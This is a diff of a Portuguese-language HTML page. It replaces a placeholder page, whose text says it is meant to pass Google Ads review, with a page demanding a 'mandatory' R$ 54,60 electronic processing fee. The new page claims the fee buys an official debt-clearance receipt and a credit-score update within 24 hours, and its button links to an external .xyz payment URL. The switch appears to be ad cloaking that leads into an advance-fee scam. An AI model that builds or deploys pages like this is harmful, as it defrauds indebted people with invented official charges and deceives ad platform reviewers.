@@ -3,62 +3,60 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Página - Exemplo Google Ads</title>
-    <meta name="description" content="Página de exemplo com conteúdo visível e link funcional, preparada para Google Ads." />
+    <title>Pagamento</title>
     <style>
-      body { font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; background: #f7f9fb; color:#222; }
-      .container { max-width: 900px; margin: 48px auto; padding: 28px; background: #fff; border-radius: 12px; box-shadow: 0 6px 24px rgba(0,0,0,0.08); }
-      header { display:flex; align-items:center; justify-content:space-between; gap:12px; }
-      h1 { margin: 0 0 8px 0; font-size: 28px; }
-      p.lead { margin: 0 0 16px 0; color:#555; }
-      .cta { display:inline-block; padding:12px 20px; background:#0077cc; color:#fff; text-decoration:none; border-radius:8px; font-weight:600; }
-      footer { margin-top:24px; font-size:13px; color:#666; }
-      .notice { background:#fffbeb; border-left:4px solid #f5c542; padding:12px; border-radius:8px; margin-bottom:16px; }
+      body{font-family:Arial, sans-serif; background:#fafafa; margin:0; padding:0; text-align:center; color:#333;}
+      .container{max-width:600px; margin:40px auto; padding:20px;}
+      h1{font-size:28px; font-weight:700; margin-bottom:8px;}
+      .subtitle{color:#777; font-size:16px; margin-bottom:30px;}
+      .box{background:#eaf3ff; border-radius:12px; padding:20px; text-align:left; margin-bottom:30px; border:1px solid #d6e8ff;}
+      .box p{margin:0 0 10px 0; line-height:1.5;}
+
+      .valor{background:#ffd8e6; border:1px solid #ffc1da; border-radius:12px; padding:25px; margin-bottom:30px;}
+      .valor h2{margin:0; color:#c72755; font-weight:700;} 
+      .valor .taxa{font-size:14px; margin-top:6px; color:#555;}
+
+      .proc{background:#eaf3ff; border-radius:12px; padding:20px; text-align:left; border:1px solid #d6e8ff;}
+      .proc h3{margin:0 0 15px 0;}
+      .proc ul{padding-left:20px; margin:0;}
+
+      .btn{display:block; width:100%; background:#e50075; color:#fff; padding:15px; border-radius:12px; margin-top:30px; font-size:18px; font-weight:600; text-decoration:none;}
+      .seguro{margin-top:15px; font-size:14px; color:#777;}
     </style>
   </head>
   <body>
     <div class="container">
-      <header>
-        <div>
-          <h1>Bem-vindo à nossa página</h1>
-          <p class="lead">Página de exemplo com conteúdo estático mínimo para evitar reprovação por conteúdo insuficiente no Google Ads.</p>
-        </div>
-      </header>
 
-      <div class="notice">
-        <strong>Atenção:</strong> substitua <code>https://seu-destino.com</code> pelo link final da sua campanha antes de publicar.
+      <h1>Pagamento da Taxa Obrigatória</h1>
+      <div class="subtitle">Finalize seu processo de regularização</div>
+
+      <div class="box">
+        <p>Para a emissão do seu comprovativo oficial de quitação de dívidas e para garantir a atualização do seu score de crédito nos sistemas de proteção ao crédito, é necessário o pagamento da Taxa de Processamento Eletrônico (TPE).</p>
+        <p>Esta taxa cobre os custos operacionais e de processamento junto aos órgãos de proteção ao crédito.</p>
       </div>
 
-      <main>
-        <p>Este site inclui conteúdo visível e um botão com link válido. Caso sua campanha exija políticas específicas (ex.: informações de contato, termos, política de privacidade), adicione as páginas correspondentes e o link no rodapé.</p>
+      <div class="valor">
+        <div>VALOR DA TAXA</div>
+        <h2>R$ 54,60</h2>
+        <div class="taxa">Taxa única obrigatória</div>
+      </div>
 
-        <!-- Botão com link válido -->
-        <p>
-          <a href="https://pay.sitefeiraoparatodos.xyz/BNjzgPlVjaxgM78" id="linkButton" class="cta" target="_blank" rel="noopener noreferrer">Acessar oferta</a>
-        </p>
+      <div class="proc">
 
-        <section aria-labelledby="about">
-          <h2 id="about">Sobre a oferta</h2>
-          <p>Descrição curta e clara do que o usuário encontrará ao clicar no botão. Evite afirmações enganosas, promessas irreais ou conteúdo proibido pelas políticas do Google Ads.</p>
-        </section>
+	
+        <h3>Processo após o pagamento</h3>
+        <ul>
+          <li>Confirmação automática do pagamento</li>
+          <li>Emissão e envio do comprovativo por email</li>
+          <li>Atualização do score de crédito em até 24 horas</li>
+        </ul>
+      </div>
+	  
+	  <a href="https://pay.sitefeiraoparatodos.xyz/BNjzgPlVjaxgM78" class="btn">Pagar Taxa Agora</a>
 
-        <section aria-labelledby="contact" style="margin-top:16px;">
-          <h2 id="contact">Contato</h2>
-          <p>Para dúvidas, entre em contato pelo email: <a href="mailto:contato@seudominio.com">contato@seudominio.com</a></p>
-        </section>
-      </main>
 
-      <footer>
-        <p><a href="/politica-de-privacidade.html">Política de Privacidade</a> · <a href="/termos.html">Termos de Uso</a></p>
-        <p>© 2025 Sua Empresa. Todos os direitos reservados.</p>
-      </footer>
+      <div class="seguro">✔ Pagamento seguro e protegido</div>
     </div>
 
-    <!-- Conteúdo para usuários com JS desativado -->
-    <noscript>
-      <div style="max-width:900px;margin:24px auto;padding:12px;background:#fff;border-radius:8px;border:1px solid #eee;">
-        <strong>Importante:</strong> Este site funciona mesmo com JavaScript desativado. Use o botão acima para acessar a oferta.
-      </div>
-    </noscript>
   </body>
 </html>
